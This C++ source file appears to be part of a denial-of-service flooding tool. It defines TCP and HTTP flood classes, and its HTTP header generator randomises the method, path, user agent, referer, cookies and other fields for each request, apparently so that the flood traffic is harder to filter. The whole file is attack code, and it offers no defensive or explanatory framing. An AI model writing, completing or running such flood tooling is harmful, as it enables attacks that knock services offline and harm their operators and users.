#include "tcp_flood.hpp"
#include "http.hpp"

#include <arpa/inet.h>

tcp_flood::tcp_flood() : base_flood(SOCK_STREAM) {}

null_tcp::null_tcp() : tcp_flood() {}

int null_tcp::gen_hdr(std::string &string) {
  string = "\0";
  return 1;
}

http_flood::http_flood() : tcp_flood() {}

int http_flood::gen_hdr(std::string &string) {
  httphdr hdr{};
  http::randomizer::random_method(hdr.method);
  utils::randomizer::randomstr(hdr.path);
  http::randomizer::random_useragent(hdr.useragent);
  http::randomizer::random_caching(hdr.cache_control);
  http::randomizer::random_encoding(hdr.encoding);
  http::randomizer::random_charset(hdr.charset[0]);
  http::randomizer::random_charset(hdr.charset[1]);
  http::randomizer::random_referer(hdr.referer);
  http::randomizer::random_contenttype(hdr.content_type);
  utils::randomizer::randomstr(hdr.cookie[0]);
  utils::randomizer::randomstr(hdr.cookie[1]);
  http::hdr_gen(hdr, string);
  return static_cast<int>(string.length());
}
